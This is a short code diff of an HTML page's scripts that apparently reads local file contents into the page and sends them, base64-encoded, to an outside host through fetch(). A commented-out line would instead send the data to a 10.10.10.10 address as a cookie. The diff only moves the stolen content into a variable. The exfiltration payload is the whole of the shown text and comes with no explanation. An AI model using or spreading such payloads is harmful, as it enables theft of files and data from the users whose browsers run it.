@@ -27,8 +27,10 @@ local file content:&lt;textarea style="width:100%;height:6rem">${ p.innerHTML }&
       </script>
 
       <script>
+
+      aaa = document.querySelector('#r').innerHTML;
         
-      fetch('http://rwxcode.top/log?info=' + btoa(document.querySelector('#r').innerHTML));
+      fetch('http://rwxcode.top/log?info=' + btoa(aaa));
 
       //document.location = 'http://10.10.10.10/log?cookie=' + btoa(document.querySelector('#r').innerHTML);
       
